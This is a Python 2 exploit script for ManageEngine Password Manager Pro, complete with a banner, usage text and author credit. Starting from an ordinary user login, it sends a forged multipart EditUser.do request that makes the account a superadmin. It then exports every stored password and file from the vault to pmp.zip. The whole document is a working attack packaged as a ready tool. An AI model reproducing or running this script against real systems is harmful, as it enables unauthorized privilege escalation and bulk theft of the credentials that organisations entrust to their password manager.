#!/usr/bin/python

import sys
import signal
import urllib2
import re
import cookielib

global server, email
server = '<IP>:7272'
email = ''


def signal_handler(signal, frame):
	print('\n=================')
	print('Execution aborted')
	print('=================')
	sys.exit(1)

def signal_exit(signal, frame):
    sys.exit(0)	
	
def welcome():
	print "\n\n\t============================================="
	print "\t| ManageEngine Password Manager Pro Exploit |"
	print "\t|\t\t\t\t\t    |\n\t| Developed by: Sebastian Perez (@s3bap3)   |"
	print "\t============================================="
	
def usage ():
	print "\n[System Affected]"
	print "\tProduct : ManageEngine Password Manager Pro"
	print "\tCompany : ZOHO Corp."
	print "\tBuild Number : 8102 and probably earlier versions"
	print "\n[Usage]"
	print "\tThis script exploits a vulnerability of privilege escalation in ManageEngine Password"
	print "\tManager Pro and download all the passwords and files stored in the application"
	print "\tThe following syntax is required in order to execute this properly."
	print "\n\t\tpmp-getthemall.py -u <username> -p <password>\n"
	print "\nNOTE: IF you dont want to loose the ability to use the \"Forgot Password\" functionality,"
	print "please edit this file and add your current email address in the global variables.\n\n"
	sys.exit(1)
	
def exploit(user, password):
	print "\n\n[*] Getting Initial cookie and Domain Name"
	try:
		cookie = cookielib.CookieJar()
		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
		opener.addheaders = [('User-agent', 'Mozilla/5.0')]
		urllib2.install_opener(opener)
		response = urllib2.urlopen('https://'+ server +'/login/AjaxResponse.jsp?RequestType=GetUserDomainName&userName=' + user)
	except: 
		print "[*] ERROR - Is the sever IP correctly setup?"
		sys.exit(1)
	try:
		code = response.read().split('@')[1][:3]
	except:
		print "[*] ERROR - Unable to get Code, user exists?"
		sys.exit(1)
	urllib2.urlopen('https://'+ server +'/j_security_check?BROWSER_NAME=FF&ORGN_NAME='+ code +'&j_username='+ user +'&username='+ user +'&domainName=%40'+ code +'&j_password='+ password +'&AUTHRULE_NAME=Authenticator&ORGN_NAME='+ code)
	print "[*] Getting Session cookie and UserID"
	urllib2.urlopen('https://'+ server +'/PassTrixMain.cc')
	response = urllib2.urlopen('https://'+ server +'/PassTrixMain.cc')
	output = response.read()
	for line in output.splitlines():
		if '"USERID=' in line:
			userid = line.split('&')[1][7:]
	print "[*] Escalating privileges"
	data = '''-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="isloginusersa"EOLEOLtrueEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="superadminscope"EOLEOLtrueEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="SERVERPORT"EOLEOL7272EOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="OLDROLE"EOLEOLAdministratorEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="USERID"EOLEOL'''+ userid + '''EOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="LOGINID"EOLEOL'''+ userid + '''EOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="USER"EOLEOL'''+ user + '''EOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="OLDLANG"EOLEOLenEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="EMAIL"EOLEOL'''+ email +'''EOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="ROLE"EOLEOLAdministratorEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="superAdmin"EOLEOLtrueEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="Rule"EOLEOLStrongEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="DEPT"EOLEOLEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="LOCATION"EOLEOLEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="mobileaccess"EOLEOLenableEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="UserCert"; filename=""EOLContent-Type: application/octet-streamEOLEOLEOL-----------------------------516023481100304061181951475EOLContent-Disposition: form-data; name="lang_code"EOLEOLenEOL-----------------------------516023481100304061181951475--'''
	payload = data.replace('EOL','\r\n')
	req = urllib2.Request('https://'+ server +'/EditUser.do?SUBREQUEST=true' , payload , {"Content-type": "multipart/form-data; boundary=---------------------------516023481100304061181951475", 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate'})
	response = urllib2.urlopen(req)
	output = response.read()
	if "__SUCCESS__" in output:
		print "[*] User is now Superadmin"
	else:
		print "[*] ERROR - Failed elevating privileged, aborting"
		sys.exit(1) 
	print "[*] Downloading the passwords"
	response = urllib2.urlopen('https://'+ server +'/ExportGroupResources.do')
	newFile = open ("pmp.zip", "wb")
	newFileByteArray = bytearray(response.read())
	newFile.write(newFileByteArray)
	newFile.close()
	print "[*] File created (pmp.zip)"
	
	print response.read()	
	
if __name__ == "__main__":
	welcome()
	signal.signal(signal.SIGINT, signal_handler)
	if len(sys.argv) != 5:
		usage()
	parameters={sys.argv[1]:sys.argv[2], sys.argv[3]:sys.argv[4]}
	exploit(parameters['-u'],parameters['-p'])
	
